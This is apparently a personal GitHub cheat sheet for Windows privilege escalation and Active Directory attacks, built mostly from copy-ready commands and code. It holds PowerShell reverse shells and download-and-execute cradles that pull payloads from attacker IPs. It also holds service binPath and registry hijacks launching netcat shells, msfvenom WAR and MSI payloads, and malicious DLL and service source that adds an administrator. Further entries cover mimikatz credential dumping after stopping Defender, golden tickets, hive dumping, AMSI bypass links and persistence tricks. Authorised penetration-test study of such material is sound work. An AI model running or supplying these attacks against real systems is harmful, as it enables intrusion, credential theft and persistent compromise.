# Windows Privilege Escalation tools to help me get system access.
The list below all come from the list of great resources below. I do not take credit for any of these.

## GREAT Privesc Resources

Gread Windows Privilege Escalation Walk-through:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md  
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html  
https://github.com/AonCyberLabs/Windows-Exploit-Suggester  
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation  
https://github.com/frizb/Windows-Privilege-Escalation  
https://github.com/Mafia/PowerSploit/tree/master/Privesc  
https://oscp.securable.nl/privilege-escalation  
http://www.fuzzysecurity.com/tutorials/16.html  
https://0xbam.blogspot.com/2019/04/oscp-methodology.html  
https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/  
https://www.hackingarticles.in/impacket-guide-smb-msrpc/  
https://www.secureauth.com/labs/open-source-tools/impacket  
  
### [Check user]
```
$env:UserName
whoami
```

### [Windows-Privesc-Check]

```
Usage:
windows-privesc-check2.exe --audit -a -o wpc-report
```
More information Regarding Windows-Privesc-Check please refer to: https://github.com/pentestmonkey/windows-privesc-check/blob/master/docs/QuickStartUsage.md

### [Check current priv]
```
whoami /priv
whoami /all
cmdkey /list
```

### [Check hotfixes]
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```

### [Check Services]
```
get-acl HKLM:\System\CurrentControlSet\services\*
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "<username> Users Path"
Get-Service <servicename> | fl *
```

### [Check file permissions and grand full access to a specified user]
```
dir /q /a:
cmd /c "dir /q /a:"
icacls <filename>
icacls <filename> /grant <username>:(F)
cmd /c "icacls <filename> /grant <username>:(F)"
```

### [Get Service Name and Path (May Require Escalated Privileges)]
```
Get-Service
Get-WmiObject win32_service | ?{$_.Name -like '*<ServiceName>*'} | select Name, DisplayName, State, PathName
"<servicename>" | Get-ServiceAcl | select -ExpandProperty Access
```

### [Check scheduled Tasks]
```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
schtasks /query /fo LIST /v
```

### [List installed software]
```
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
wmic product get name, version, vendor
```

### [Check Drivers]
```
DRIVERQUERY
```

### [Check privileges for a service]
```
accesschk.exe -ucqv Spooler
```

### [Process Dumping Procdump.exe]
https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

```
Usage:
Full Dump
& 'C:\users\accountname\procdump64.exe' -accepteula -ma PIDorPROCESS dumpname.dmp

Mini Dump
& 'C:\users\accountname\procdump64.exe' -accepteula -ma PIDorPROCESS dumpname.dmp
```

### [Identify Missing Patches]
```
systeminfo
cmd /c systeminfo
```

### [Enumerate Windows System Creds without tools]
```
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s
```

### [Enumerate Windows Autologon Creds]
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### [Powerup.ps1 Usage]
```
Manual Powershell Priv esc powerup.ps1
powershell -nop -exec bypass
Import-Module .\powerup.ps1
Invoke-AllChecks
```

### [PowerView.ps1 Usage for Active Directory Objects]
https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```
powershell -nop -exec bypass
Import-Module .\PowerView.ps1
Get-AdObject
If you receive any errors it's possible AMSI is preventing execution. Look into AMSIbypass. EvilwinRM i use Bypass 4MSI
```

### [amsi bypass @Thanks to bugbyt3 for the recommendation]
https://amsi.fail/

### [Active Directory Enumeration]
BloodHound Ingestors

https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
```
powershell -nop -exec bypass
Import-Module .\SharpHound.ps1
Invoke-BloodHound
JSON + BloudHound zip package is then created xfer back to host and clean
```
To Import ingested data into BloodHound you must have neo4j and bloodhoundclient:

Setup NEO4J installation

https://debian.neo4j.org/?_ga=2.180534247.153130316.1570995946-1723945139.1570995946

Setup Bloodhound Client 

https://github.com/BloodHoundAD/BloodHound/releases

Starting up Neo4j
```
neo4j console
bolt://localhost:7687
```
Starting up Bloodhound Client
```
./BloodHound --no-sandbox
```
aclpwn

https://github.com/fox-it/aclpwn.py
```
aclpwn -du neo4j -dp 'Myneo4jPassword' -d name.local -f '<username>' -ft user -tt domain -t name.local -s IP
```
Dumpling Credentials from the Domain Controller

Download secretsdump.py from impacket or you can navigate to the impacket-scripts directory.
```
python3 secretsdump.py -just-dc-ntlm <WORKSTATION>/<username>@<IP> 
```
WinRM to device using password or hash

https://github.com/Hackplayers/evil-winrm
```
ruby evil-winrm.rb -i IP -u <username> -p '<password>' -s '/path/to/scripts'
```
```
ruby evil-winrm.rb -i IP -u <username> -H '<hash>' -s '/path/to/scripts'
```

### [Download file]

[Cert Util]
```
certutil.exe -urlcache -split -f http[:]//10.10.10.10/exploit.exe

certutil.exe -urlcache -f UrlAddress C:/File.txt
```

[mshta]
```
mshta http[:]//10.10.10.10/badthings.exe
```

[Powershell]
```
powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Invoke-PowerShellTcp.ps1')"
powershell.exe "IEX(New-Object Net.WebClient).downloadString(‘http://<IP_ADDRESS>/Sherlock.ps1'); Find-AllVulns"
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://your_IP/shell.ps1')
```

### Nishang Powershell reverse_TCP
```
powershell -nop "$sm=(New-Object Net.Sockets.TCPClient('<IP>',<PORT>)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
```

### [netcat for windows]
https://github.com/int0x33/nc.exe?files=1

### [Upgrading to powershell - Replace the placeholders with your local IP and PORT]
```
$client​ = New-Object System.Net.Sockets.TCPClient(​ "<IPADDRESS>"​ ,<PORT>);​ $stream​ =
$client​ .GetStream();[byte[]]​ $bytes​ = 0..65535|%{0};​ while​ ((​ $i​ = ​ $stream​ .Read(​ $bytes​ ,
0, ​ $bytes​ .Length)) -ne 0){;​ $data​ = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString(​ $bytes​ ,0, ​ $i​ );​ $sendback​ = (iex ​ $data​ 2>&1 |
Out-String );​ $sendback2​ = ​ $sendback​ + ​ "PS "​ + (​ pwd​ ).Path + ​ "> "​ ; ​ $sendbyte​ =
([text.encoding]::ASCII).GetBytes(​ $sendback2​ );​ $stream​ .Write(​ $sendbyte​ ,0,​ $sendbyte​ .L
ength);​ $stream​ .Flush()};​ $client​ .Close()
```

```
START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://example:port/shell.ps1', 'shell.ps1')"
```

### [Execute powershell script in memory]
```
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://<LocalIP>/file.ps1',$false);$h.send();iex $h.responseText
```

### [Modify Registries using powershell]
```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\services\wuauserv" -Name ImagePath -Value "C:\path\to\nc.exe IP PORT -e cmd"
```
### [executing program as a different username in powershell]
```
powershell -nop -exec bypass
$username = "<WORKSTATION\username>"
$password =  ConvertTo-SecureString "<password>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
```

### [change users on powershell (Thanks to @Xaliom for helping me find this)]
```
$username = "<domain>\<username>" ; $pw = "<password>"
$password = $pw | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
New-PSSession -Credential $cred | Enter-PSSession
```

### [BinPath and ImagePath]
https://pentestlab.blog/tag/imagepath/
```
powershell binpath
sc.exe qc usosvc
sc.exe stop usosvc
sc.exe config usosvc binPath="C:\path\to\nc.exe IP PORT -e cmd"
sc.exe qc usosvc
sc.exe start usosvc

binPath
sc config wuauserv binPath="C:\path\to\nc.exe IP PORT -e cmd"
sc query wuauserv
sc start Fax

ImagePath
sc config Fax binPath= "C:\payload.exe"
sc config Fax binPath= "C:\payload.exe" start="auto" obj="LocalSystem"
sc config Fax binPath= "C:\Windows\System32\payload.exe" start="auto" obj="LocalSystem"
sc start Fax

failure commands
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\payload.exe"
sc failure Fax command= "\"c:\Windows\system32\payload.exe\""
```

### [Locate and Portfoward using ssh]
```
netstat -tulpn | grep LISTEN
ssh -L 8000:127.0.0.1:8000 username@IP
ssh -L 8000:127.0.0.1:8000 -i id_rsa username@IP
ssh -L 8443:127.0.0.1:8443 <USER>@<RemoteIP>
```

### [Escaping Vi, Vim and Nano]
https://gtfobins.github.io/gtfobins/vi/

https://gtfobins.github.io/gtfobins/vim/

https://gtfobins.github.io/gtfobins/nano/

### [Exploiting Tomcat Manager]
```
Create your war file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<username> LPORT=<port> -f war > shell.war

Deploy your war file to tomcat manager
curl --user 'tomcat:<password>' --upload-file shell.war 'http://example.com/manager/text/deploy?path=/shell'

Create your handler
nc -nvlp <port>

http://example.com/shell to reverse tcp


or

Creating your reverse tcp jsp file

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > index.jsp

Compress your index.jsp file as a war file

jar -cvf webshell.war index.jsp

Upload your war file into apache tomcat

Create your handler

nc -nvlp <PORT>

You can then reverse tcp by navigating to your web shell that you compressed in your war file.

http://target/webshell/index.jsp

```
### [Exploiting host-manager]
https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/

Resources for exploiting tomcat manager:

https://gist.github.com/pete911/6111816

https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

### [Group Policy groups.xml]
```
password string within groups.xml can be exploited by running gpp-decrypt
gpp-decrypt <gp_password_string>
```

### [CVE-2017-12615]
Based on the article below you can exploit Apache Tomcat 7.0.0 to 7.0.79 running on Windows.
https://github.com/breaktoprotect/CVE-2017-12615
```
shell.jsp:
<% out.write("<html><body><h3>[+] JSP file successfully uploaded via curl and JSP out.write  executed.</h3></body></html>"); %>
```
```
curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
```

### [Exploiting Kerberos]
```
Retrieve hashes for users
GetNPUsers.py <DOMAIN>/ -usersfile user.list -format hashcat -output hashes.txt

Retrieving information from kerberos
GetADUsers.py -all <domain>/<username> -dc-ip <ipaddr>
GetNPUsers.py -dc-ip <IP> -request 'domain.local/'
GetNPUsers.py -dc-ip <IP> -request 'domain.local/' -format hashcat

Retrieving a ticket from kerberos
GetUserSPNs.py <domain>/<username> -dc-ip <ipaddr> -request

Shell Execution through wmi
wmiexec.py <domain>/<username>:<password>@<ipaddr>
```

### [Dll Hijacking]
```
# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

Dll Hijacking

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

### [DLL Injection recommended by Bugbyt3]
https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection

### [Creating service in registry]
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc
```

### Resources from OSCP Cheatsheet (ired.team)
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets

## [SNMP]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#snmp

### Windows User Accounts
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25

### Windows Running Programs
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2

### Windows Hostname
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5

### Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1

### Windows Share Information
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27

### Windows TCP Ports
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3

### Software Name
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2

### brute-force community strings
onesixtyone -i snmp-ips.txt -c community.txt

## [SMTP]
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#smtp

snmp-check $TARGET

smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150

## [Active Directory] 
https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#active-directory

### [current domain info]
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

### [domain trusts]
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

### [current forest info]
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

### [get forest trust relationships]
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

### [get DCs of a domain]
```
nltest /dclist:offense.local
net group "domain controllers" /domain
```

### [get DC for currently authenticated session]
nltest /dsgetdc:offense.local

### [get domain trusts from cmd shell]
nltest /domain_trusts

### [get user info]
nltest /user:"spotless"

### [get DC for currently authenticated session]
set l

### [get domain name and DC the user authenticated to]
klist

### [get all logon sessions. Includes NTLM authenticated sessions]
klist sessions

### [kerberos tickets for the session]
klist

### [cached krbtgt]
klist tgt

### [whoami on older Windows systems]
set u

### [find DFS shares with ADModule]
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

### [find DFS shares with ADSI]
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

### [check if spooler service is running on a host]
powershell ls "\\dc01\pipe\spoolss"

### [Applocker: Writable Windows Directories]
```
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

### [Find writable files/folders]
```
$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}
```

### [Launch evil.exe every 10 minutes]
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe

### [Kernel exploit]
https://github.com/SecWiki/windows-kernel-exploits

### [Reverse TCP Windows without metasploit]

https://github.com/dev-frog/C-Reverse-Shell

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### [Auto run reverse TCP]
```
1. Creating your reverse TCP payload

2. Transfer your payload over to your windows host

3. Log off and log in to execute your reverse TCP.
C:\Users\<CurrentProfile>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### [Creating a evil msi package]
```
1. Create your msi payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o badsetup.msi
2. Transfer your payload over to your windows host/
3. Execute your msi payload
msiexec /quiet /qn /i C:\Temp\badsetup.msi
```

### [Creating an evil regsvc]
1. Confirm vulnerable regkey by checking Privilges of regsvc. (“NT AUTHORITY\INTERACTIVE” “FullContol”)  
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

2. Compiling your windows service exploit written in C.   
https://github.com/sagishahar/scripts/blob/master/windows_service.c  

3. Transfer your payload to your windows box  

4. Executing your payload  
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f  
sc start regsvc  

If in the event the script cannot be accessed through sagishahar's github page you can also copy and paste the below code  

```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 
```

### [Exploiting an vulnerable directory using by a service]
```
accesschk64.exe -wvu "c:\path\of\service\directory"
“Everyone” user group has “FILE_ALL_ACCESS”

copy /y c:\path\to\privesc.exe "c:\path\of\service\directory\servicebinaryname.exe
```

### [Dll Hijacking of service]  
  
1. Add your payload into your dll.c code within your system() function (see below code or you can access sagishahar's code as well)   
https://github.com/sagishahar/scripts/blob/master/windows_dll.c  
2. Compile your codeinto a dll  
x86_64-w64-mingw32-gcc dll.c -shared -o payload.dll  
3. Transfer to target  
4. Stop and start service that uses your dll  
sc stop servicename & sc start servicename  
  
```c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\poop.txt");
        ExitProcess(0);
    }
    return TRUE;
}

```

### [Privesc using tater]
https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1
```
1. powershell -nop -exec bypass
2. Import-Module .\Tater.ps1
3. Invoke-Tater -Trigger 1 -Command "nc <IP> <PORT> -e 'cmd'"
```

### [privesc via juicy potato]
https://github.com/ohpe/juicy-potato  
https://github.com/ohpe/juicy-potato/releases  
https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato  
https://ohpe.it/juicy-potato/CLSID/  
```
CLSID is based on operating system, see above links for more information about list of CLSIDS.
.\juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
.\juicypotato.exe -l 1337 -p c:\test\revshell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### [lolbins]
https://lolbas-project.github.io/lolbas/Binaries/Certreq/

### [Hacking IOT Devices]
https://github.com/SafeBreach-Labs/SirepRAT

```
python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile <OUTDIR> -Uri <URL>" --v

python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c <PAYLOAD>" --v
```

### [Common safe drop paths]
```
C:\\Windows\\System32\\spool\\drivers\\color\\
```

### [decrypt password within xml file using Import-CliXml]
```
$credential = Import-CliXml -Path <xml dat with encrypted password>
$credential.GetNetworkCredential().Password
```

### [PSEXEC]
```
python psexec.py <username>:'<password>'@<IP>
```

### [Create network share using powershell]
```
$pass = convertto-securestring '<RemotePASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<RemoteUsername>', $pass)
New-PSDrive -Name drivename -PSProvider FileSystem -Credential $cred -Root \\<RemoteIP>\<RemoteShare>
```

### [Creating a malicious DLL using GreatSCT]
```
cd ~/
git clone https://github.com/GreatSCT/GreatSCT
cd GreatSCT
sudo ./GreatSCT.py --ip <IP> --port <PORT> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o revshell

OutDir
/usr/share/greatsct-output/compiled/revshell.dll

Execution of malicious DLL
cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Temp\revshell.dll
```

### [Recursively search items using powershell]
```
gci -r -fi NameOfFile.exe
gci -r -fi NameOf*
gci -r -fi *.exe
```

### [Search for a string within files using powershell]
```
findstr /s "keyword" .\*
```

### [Mimikatz]
https://github.com/gentilkiwi/mimikatz  

Binary Releases  
https://github.com/gentilkiwi/mimikatz/releases  

Cheat sheet:  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md  

To Dump Credentials for the host:

```
Disable Windows Defender:

sc stop WinDefend

Run Powershell as administrator to get a shell as NT AUTHORITY/system

.\mimikatz

sekurlsa::logonPasswords full
```

Generating a golden ticket on kerberos using mimikatz:  
https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/  
https://attack.stealthbits.com/how-golden-ticket-attack-works  

```
mimikatz# kerberos::golden /admin:<USERNAME> /domain:<DOMAIN> /id:<FAKE_RID> /sid:<SID> /krbtgt:<NTLM_HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt

.\mimikatz_64.exe "kerberos::golden /domain:domain.local /sid:<SID> /rc4:<NTLM> /id:500 /user:TrustMe" exit
```

NTLM Password Generator if you do not have a NTLM hash  
https://www.browserling.com/tools/ntlm-hash  

### [Binary Replacement]
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md#binary-replacement

```
Sticky Keys	
C:\Windows\System32\sethc.exe

Accessibility Menu	
C:\Windows\System32\utilman.exe

On-Screen Keyboard	
C:\Windows\System32\osk.exe

Magnifier	
C:\Windows\System32\Magnify.exe

Narrator	
C:\Windows\System32\Narrator.exe

Display Switcher	
C:\Windows\System32\DisplaySwitch.exe

App Switcher	
C:\Windows\System32\AtBroker.exe
```

### Windows Exploit Suggester - Requirements: (install python-xlrd, $ pip install xlrd --upgrade)

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Generate your exploit database

```
python windows-exploit-suggester.py --update
```

Exploit suggester using systeminfo output

```
./windows-exploit-suggester.py --database exploit_database.xlsx --systeminfo sysinfo.txt
```

Exploit suggester using particular OS without suggested hotfixes

```
./windows-exploit-suggester.py --database exploit_database.xlsx --ostext 'windows server 2008 r2' 
```

### running a program as a different user using runas
```
runas /user:<DOMAIN>\<USER> /savecred "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<IP>/shell.ps1')"
```

### Pentesting VNC

https://www.hackingarticles.in/vnc-penetration-testing/
